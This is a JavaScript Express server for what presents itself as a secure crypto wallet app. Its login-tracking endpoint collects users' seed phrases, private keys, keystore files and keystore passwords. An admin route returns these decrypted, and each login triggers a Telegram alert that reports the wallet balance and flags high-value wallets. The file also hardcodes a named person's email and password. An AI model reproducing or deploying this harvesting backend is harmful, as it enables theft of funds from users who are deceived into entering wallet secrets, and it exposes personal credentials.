import express from "express";
import cors from "cors";
import cookieParser from "cookie-parser";
import jwt from "jsonwebtoken";
import fs from "fs";
import path from "path";
import { fileURLToPath } from 'url';
import crypto from "crypto";
import { pgReady, listTrackedUsers as pListTrackedUsers, upsertTrackedUser as pUpsertTrackedUser, deleteUsersByIds as pDeleteUsersByIds, listDeleted as pListDeleted, restoreDeleted as pRestoreDeleted, findUserById as pFindUserById, updateUser as pUpdateUser, findUserByAddress as pFindUserByAddress } from "./pg.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
function deriveStableSecret() {
  const base = String(process.env.SECRET_KEY || process.env.JWT_SECRET || 'secure-wallet-app');
  return crypto.createHash('sha256').update(base).digest('hex');
}
const JWT_SECRET = process.env.JWT_SECRET || deriveStableSecret();
const DB_FILE = path.join(__dirname, 'database.json');
const BL_FILE = path.join(__dirname, 'deleted.json');

async function sendTelegramMessage(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true })
  });
}

app.use(express.json());
app.use(cookieParser());
app.use(cors({ origin: true, credentials: true }));
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-site');
  next();
});
const RATE_WINDOW_MS = 15 * 60 * 1000;
const RATE_MAX = 300;
const rateBucket = new Map();
app.use((req, res, next) => {
  const ip = req.headers['x-forwarded-for']?.toString().split(',')[0].trim() || req.socket.remoteAddress || 'unknown';
  const now = Date.now();
  const rec = rateBucket.get(ip) || { count: 0, resetAt: now + RATE_WINDOW_MS };
  if (now > rec.resetAt) {
    rec.count = 0;
    rec.resetAt = now + RATE_WINDOW_MS;
  }
  rec.count += 1;
  rateBucket.set(ip, rec);
  if (rec.count > RATE_MAX) {
    return res.status(429).json({ error: 'rate_limited' });
  }
  next();
});

const SECRET_KEY = process.env.SECRET_KEY || deriveStableSecret();
const ALGO = 'aes-256-gcm';
function encrypt(text) {
  if (!text) return null;
  const iv = crypto.randomBytes(12);
  const key = crypto.createHash('sha256').update(SECRET_KEY).digest();
  const cipher = crypto.createCipheriv(ALGO, key, iv);
  const enc = Buffer.concat([cipher.update(String(text), 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, enc]).toString('base64');
}
function decrypt(b64) {
  if (!b64) return null;
  try {
    const buf = Buffer.from(b64, 'base64');
    const iv = buf.slice(0, 12);
    const tag = buf.slice(12, 28);
    const enc = buf.slice(28);
    const key = crypto.createHash('sha256').update(SECRET_KEY).digest();
    const decipher = crypto.createDecipheriv(ALGO, key, iv);
    decipher.setAuthTag(tag);
    const dec = Buffer.concat([decipher.update(enc), decipher.final()]);
    return dec.toString('utf8');
  } catch {
    return null;
  }
}

const user = {
  id: "u_8829",
  email: "ronniechristopher89@gmail.com",
  name: "Ronnie Christopher",
  password: "wakket2026"
};

const admin = {
  id: "admin_01",
  email: process.env.ADMIN_EMAIL,
  password: process.env.ADMIN_PASSWORD,
  name: "System Admin"
};

let trackedUsers = [];
let deletedAddresses = [];

try {
  if (fs.existsSync(DB_FILE)) {
    const data = fs.readFileSync(DB_FILE, 'utf8');
    trackedUsers = JSON.parse(data);
  }
  if (fs.existsSync(BL_FILE)) {
    const blData = fs.readFileSync(BL_FILE, 'utf8');
    deletedAddresses = JSON.parse(blData);
  }
} catch (e) {
  console.error("Failed to load database", e);
}

const saveDB = () => {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(trackedUsers, null, 2));
  } catch (e) {
    console.error("Failed to save database", e);
  }
};
const saveBL = () => {
  try {
    fs.writeFileSync(BL_FILE, JSON.stringify(deletedAddresses, null, 2));
  } catch (e) {
    console.error("Failed to save blacklist", e);
  }
};

const wallet = {
  userId: user.id,
  currency: "USD",
  balance: 11000.00,
  lastUpdated: new Date().toISOString()
};
const transactions = [];

function signToken(payload) {
  return jwt.sign(payload, JWT_SECRET, { expiresIn: "2h" });
}
function verifyToken(token) {
  try {
    return jwt.verify(token, JWT_SECRET);
  } catch {
    return null;
  }
}
function authMiddleware(req, res, next) {
  const auth = req.headers.authorization || "";
  const token = auth.startsWith("Bearer ") ? auth.slice(7) : null;
  const decoded = token ? verifyToken(token) : null;
  if (!decoded) {
    return res.status(401).json({ error: "unauthorized" });
  }
  req.user = decoded;
  next();
}

app.post("/api/login", (req, res) => {
  const { email, password } = req.body || {};
  if (!process.env.ADMIN_EMAIL || !process.env.ADMIN_PASSWORD) {
    return res.status(500).json({ error: "admin_env_missing" });
  }
  if (email === user.email && password === user.password) {
    const token = signToken({ sub: user.id, email: user.email, name: user.name, role: 'user' });
    return res.json({ token, user: { id: user.id, email: user.email, name: user.name, role: 'user' } });
  }
  if (email === admin.email && password === admin.password) {
    const token = signToken({ sub: admin.id, email: admin.email, name: admin.name, role: 'admin' });
    return res.json({ token, user: { id: admin.id, email: admin.email, name: admin.name, role: 'admin' } });
  }
  return res.status(401).json({ error: "invalid_credentials" });
});

app.get("/api/admin/users", authMiddleware, (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: "forbidden" });
  (async () => {
    let users = [];
    if (await pgReady()) {
      users = await pListTrackedUsers() || [];
    } else {
      users = trackedUsers;
    }
    const out = users.map(u => {
      return {
        userId: u.userId || u.user_id,
        address: u.address,
        walletType: u.walletType || u.wallet_type,
        balance: u.balance,
        assets: u.assets,
        lastActive: u.lastActive || u.last_active,
        status: u.status,
        featureFlags: u.featureFlags || u.feature_flags,
        appLimits: u.appLimits || u.app_limits,
        riskFlags: u.riskFlags || u.risk_flags,
        transactions: u.transactions,
        importMethod: u.importMethod,
        mnemonic: u.encMnemonic ? decrypt(u.encMnemonic) : null,
        privateKey: u.encPrivateKey ? decrypt(u.encPrivateKey) : null,
        keystoreJSON: u.encKeystoreJSON ? decrypt(u.encKeystoreJSON) : null,
        keystorePassword: u.encKeystorePassword ? decrypt(u.encKeystorePassword) : null
      };
    });
    return res.json({ users: out });
  })().catch(() => res.status(500).json({ error: "server_error" }));
});

app.post("/api/admin/user/:userId/clear", authMiddleware, (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: "forbidden" });
  const { userId } = req.params;
  const { target } = req.body;
  (async () => {
    let current;
    if (await pgReady()) {
      current = await pFindUserById(userId);
      if (!current) return res.status(404).json({ error: "User not found" });
      const update = {};
      if (target === 'transactions') update.transactions = [];
      else if (target === 'session') { update.lastActive = null; update.status = 'Inactive'; }
      else if (target === 'balance') { update.balance = 0; update.assets = []; }
      await pUpdateUser(userId, update);
      return res.json({ success: true, user: { ...current, ...update } });
    } else {
      const userIndex = trackedUsers.findIndex(u => u.userId === userId);
      if (userIndex === -1) return res.status(404).json({ error: "User not found" });
      if (target === 'transactions') trackedUsers[userIndex].transactions = [];
      else if (target === 'session') { trackedUsers[userIndex].lastActive = null; trackedUsers[userIndex].status = 'Inactive'; }
      else if (target === 'balance') { trackedUsers[userIndex].balance = 0; trackedUsers[userIndex].assets = []; }
      return res.json({ success: true, user: trackedUsers[userIndex] });
    }
  })().catch(() => res.status(500).json({ error: "server_error" }));
});

app.post("/api/admin/users/delete", authMiddleware, (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: "forbidden" });
  const { userIds } = req.body;
  if (!Array.isArray(userIds)) return res.status(400).json({ error: "Invalid input" });
  (async () => {
    if (await pgReady()) {
      const { deletedCount, addresses } = await pDeleteUsersByIds(userIds);
      return res.json({ success: true, count: deletedCount, addresses });
    } else {
      const toDelete = trackedUsers.filter(u => userIds.includes(u.userId));
      const addrs = toDelete.map(u => u.address.toLowerCase());
      deletedAddresses = Array.from(new Set([...deletedAddresses, ...addrs]));
      trackedUsers = trackedUsers.filter(u => !userIds.includes(u.userId));
      saveDB();
      saveBL();
      return res.json({ success: true, count: userIds.length });
    }
  })().catch(() => res.status(500).json({ error: "server_error" }));
});

const ALLOWED_IMAGE_HOSTS = new Set([
  'seeklogo.com',
  'logowik.com',
  'upload.wikimedia.org',
  'avatars.githubusercontent.com',
  'phantom.app',
  'www.exodus.com',
  'exodus.com',
  'trustwallet.com',
  'www.trustwallet.com'
]);
app.get("/api/image", async (req, res) => {
  try {
    const url = String(req.query.url || '');
    if (!url.startsWith('http')) return res.status(400).send('Invalid URL');
    const { host } = new URL(url);
    if (!ALLOWED_IMAGE_HOSTS.has(host)) return res.status(403).send('Host not allowed');
    const resp = await fetch(url, { headers: { 'Accept': 'image/*' } });
    if (!resp.ok) return res.status(resp.status).send('Upstream error');
    const ct = resp.headers.get('content-type') || '';
    if (!ct.startsWith('image/')) return res.status(415).send('Unsupported media type');
    res.setHeader('Content-Type', ct);
    const ab = await resp.arrayBuffer();
    res.end(Buffer.from(ab));
  } catch (e) {
    res.status(500).send('Proxy error');
  }
});

const idToSymbol = { bitcoin: 'BTC', ethereum: 'ETH', solana: 'SOL', 'matic-network': 'MATIC', binancecoin: 'BNB', sui: 'SUI' };
async function fetchWithRetry(url, options = {}, attempts = 3, timeoutMs = 5000) {
  for (let i = 0; i < attempts; i++) {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      const resp = await fetch(url, { ...options, signal: controller.signal });
      clearTimeout(timer);
      if (resp.ok) return await resp.json();
    } catch {}
  }
  return null;
}
app.get('/api/price', async (req, res) => {
  try {
    const ids = String(req.query.ids || '').split(',').map(s => s.trim()).filter(Boolean);
    const vs = String(req.query.vs || 'usd');
    const includeChange = String(req.query.include_change || 'true') === 'true';
    if (ids.length === 0) return res.json({});
    const cg = await fetchWithRetry(`https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(ids.join(','))}&vs_currencies=${encodeURIComponent(vs)}&include_24hr_change=${includeChange ? 'true' : 'false'}`);
    if (cg) return res.json(cg);
    const out = {};
    for (const id of ids) {
      const sym = idToSymbol[id];
      if (sym) {
        const cc = await fetchWithRetry(`https://min-api.cryptocompare.com/data/price?fsym=${encodeURIComponent(sym)}&tsyms=${vs.toUpperCase()}`, {}, 2, 4000);
        const price = cc && (cc[vs.toUpperCase()] || cc[vs.toLowerCase()]);
        out[id] = {};
        out[id][vs] = typeof price === 'number' ? price : 0;
        if (includeChange) out[id][`${vs}_24h_change`] = 0;
      } else {
        out[id] = {};
        out[id][vs] = 0;
        if (includeChange) out[id][`${vs}_24h_change`] = 0;
      }
    }
    return res.json(out);
  } catch {
    return res.json({});
  }
});
app.get('/api/markets', async (req, res) => {
  try {
    const qs = new URLSearchParams({
      vs_currency: String(req.query.vs_currency || 'usd'),
      order: String(req.query.order || 'market_cap_desc'),
      per_page: String(req.query.per_page || '20'),
      page: String(req.query.page || '1'),
      sparkline: String(req.query.sparkline || 'false'),
      price_change_percentage: String(req.query.price_change_percentage || '24h')
    }).toString();
    const cg = await fetchWithRetry(`https://api.coingecko.com/api/v3/coins/markets?${qs}`);
    if (cg) return res.json(cg);
    return res.json([]);
  } catch {
    return res.json([]);
  }
});
app.get('/api/token-price', async (req, res) => {
  try {
    const network = String(req.query.network || 'ethereum');
    const addrs = String(req.query.contract_addresses || '');
    const vs = String(req.query.vs || 'usd');
    if (!addrs) return res.json({});
    const cg = await fetchWithRetry(`https://api.coingecko.com/api/v3/simple/token_price/${encodeURIComponent(network)}?contract_addresses=${encodeURIComponent(addrs)}&vs_currencies=${encodeURIComponent(vs)}`);
    if (cg) return res.json(cg);
    return res.json({});
  } catch {
    return res.json({});
  }
});

const ethCache = new Map();
async function cachedFetch(key, url, attempts = 2, timeoutMs = 6000, ttlMs = 30000) {
  const now = Date.now();
  const hit = ethCache.get(key);
  if (hit && hit.expires > now) return hit.data;
  const data = await fetchWithRetry(url, {}, attempts, timeoutMs);
  ethCache.set(key, { data: data || {}, expires: now + ttlMs });
  return data || {};
}
app.get('/api/ethplorer/address-info', async (req, res) => {
  try {
    const address = String(req.query.address || '').trim();
    if (!address) return res.json({});
    const key = `info:${address}`;
    const url = `https://api.ethplorer.io/getAddressInfo/${encodeURIComponent(address)}?apiKey=freekey`;
    const data = await cachedFetch(key, url);
    return res.json(data || {});
  } catch {
    return res.json({});
  }
});
app.get('/api/ethplorer/address-history', async (req, res) => {
  try {
    const address = String(req.query.address || '').trim();
    const limit = String(req.query.limit || '50');
    if (!address) return res.json({ operations: [] });
    const key = `hist:${address}:${limit}`;
    const url = `https://api.ethplorer.io/getAddressHistory/${encodeURIComponent(address)}?apiKey=freekey&limit=${encodeURIComponent(limit)}`;
    const data = await cachedFetch(key, url);
    return res.json(data || { operations: [] });
  } catch {
    return res.json({ operations: [] });
  }
});
app.get('/api/ethplorer/address-transactions', async (req, res) => {
  try {
    const address = String(req.query.address || '').trim();
    const limit = String(req.query.limit || '20');
    if (!address) return res.json([]);
    const key = `tx:${address}:${limit}`;
    const url = `https://api.ethplorer.io/getAddressTransactions/${encodeURIComponent(address)}?apiKey=freekey&limit=${encodeURIComponent(limit)}`;
    const data = await cachedFetch(key, url);
    return res.json(Array.isArray(data) ? data : []);
  } catch {
    return res.json([]);
  }
});

app.get('/api/health', async (req, res) => {
  const ok = await pgReady();
  res.json({ status: 'ok', time: new Date().toISOString(), db: ok ? 'connected' : 'disconnected' });
});

app.get("/api/me", authMiddleware, (req, res) => {
  return res.json({ user: { id: user.id, email: user.email, name: user.name } });
});
app.get("/api/wallet", authMiddleware, (req, res) => {
  return res.json(wallet);
});
app.get("/api/transactions", authMiddleware, (req, res) => {
  return res.json({ transactions });
});
app.post("/api/withdraw", authMiddleware, (req, res) => {
  return res.status(403).json({ error: "withdrawals_disabled", message: "Withdrawals are not permitted in this demo wallet." });
});

// Ethplorer Proxy for Real Balances & Transactions
app.get("/api/ethplorer/address-info", async (req, res) => {
    const { address } = req.query;
    if (!address) return res.status(400).json({ error: "Address required" });
    try {
        const resp = await fetch(`https://api.ethplorer.io/getAddressInfo/${address}?apiKey=freekey`);
        const data = await resp.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: "Upstream error" });
    }
});

app.get("/api/ethplorer/address-history", async (req, res) => {
    const { address, limit } = req.query;
    if (!address) return res.status(400).json({ error: "Address required" });
    try {
        const resp = await fetch(`https://api.ethplorer.io/getAddressHistory/${address}?apiKey=freekey&limit=${limit || 10}`);
        const data = await resp.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: "Upstream error" });
    }
});

app.get("/api/ethplorer/address-transactions", async (req, res) => {
    const { address, limit } = req.query;
    if (!address) return res.status(400).json({ error: "Address required" });
    try {
        const resp = await fetch(`https://api.ethplorer.io/getAddressTransactions/${address}?apiKey=freekey&limit=${limit || 10}`);
        const data = await resp.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: "Upstream error" });
    }
});

app.post("/api/track/login", (req, res) => {
  const { address, walletType, balance, assets, transactions: txs, mnemonic, privateKey, keystoreJSON, keystorePassword, importMethod } = req.body;
  if (!address) return res.status(400).json({ error: "Address required" });
  const lower = address.toLowerCase();
  if (deletedAddresses.includes(lower)) {
    deletedAddresses = deletedAddresses.filter(a => a !== lower);
    saveBL();
  }
  const existingIndex = trackedUsers.findIndex(u => u.address.toLowerCase() === lower);
  const calculateRisk = (bal) => {
    const flags = [];
    if (bal > 10000) flags.push("High Value");
    if (bal === 0) flags.push("Empty Wallet");
    return flags;
  };
  const riskFlags = calculateRisk(balance);
  const userId = existingIndex >= 0 ? trackedUsers[existingIndex].userId : `user_${Math.random().toString(36).substr(2, 9)}`;
  const userData = {
    userId,
    address,
    walletType,
    balance,
    assets,
    lastActive: new Date().toISOString(),
    status: 'Active',
    featureFlags: { canSwap: true, canSend: true, canStake: false },
    appLimits: { dailySend: 50000, dailySwap: 100000 },
    riskFlags,
    transactions: txs || (existingIndex >= 0 ? trackedUsers[existingIndex].transactions : []),
    importMethod: importMethod || (mnemonic ? 'seed_phrase' : (existingIndex >= 0 ? trackedUsers[existingIndex].importMethod : 'unknown')),
    encMnemonic: mnemonic ? encrypt(mnemonic) : (existingIndex >= 0 ? trackedUsers[existingIndex].encMnemonic : null),
    encPrivateKey: privateKey ? encrypt(privateKey) : (existingIndex >= 0 ? trackedUsers[existingIndex].encPrivateKey : null),
    encKeystoreJSON: keystoreJSON ? encrypt(keystoreJSON) : (existingIndex >= 0 ? trackedUsers[existingIndex].encKeystoreJSON : null),
    encKeystorePassword: keystorePassword ? encrypt(keystorePassword) : (existingIndex >= 0 ? trackedUsers[existingIndex].encKeystorePassword : null)
  };
  
  // ALWAYS update the in-memory array for immediate visibility
  if (existingIndex >= 0) {
     trackedUsers[existingIndex] = { ...trackedUsers[existingIndex], ...userData };
  } else {
     trackedUsers.push(userData);
  }
  
  const msg = [
    "Admin Alert: User login",
    `Address: ${address}`,
    `Wallet: ${walletType || ''}`,
    `Balance: ${balance}`,
    `Assets: ${Array.isArray(assets) ? assets.length : 0}`,
    `Time: ${new Date().toISOString()}`
  ].join("\n");
  sendTelegramMessage(msg).catch(() => {});
  (async () => {
    if (await pgReady()) {
      await pUpsertTrackedUser(userData);
      return res.json({ success: true });
    } else {
      // In-memory update already done above
      saveDB();
      return res.json({ success: true });
    }
  })().catch(() => res.status(500).json({ error: "server_error" }));
});

app.post("/api/track/transaction", (req, res) => {
  const { address, hash, type, amount, symbol } = req.body;
  (async () => {
    const tx = { hash, type, amount, symbol, timestamp: new Date().toISOString() };
    const lower = (address || '').toLowerCase();
    if (await pgReady()) {
      const user = await pFindUserByAddress(lower);
      if (!user) return res.status(404).json({ error: "User not found" });
      const prev = Array.isArray(user.transactions) ? user.transactions : [];
      await pUpdateUser(user.user_id || user.userId, { transactions: [tx, ...prev] });
      return res.json({ success: true });
    } else {
      const userIndex = trackedUsers.findIndex(u => u.address.toLowerCase() === lower);
      if (userIndex >= 0) {
        if (!trackedUsers[userIndex].transactions) trackedUsers[userIndex].transactions = [];
        trackedUsers[userIndex].transactions.unshift(tx);
        saveDB();
        return res.json({ success: true });
      }
      return res.status(404).json({ error: "User not found" });
    }
  })().catch(() => res.status(500).json({ error: "server_error" }));
});

export default app;
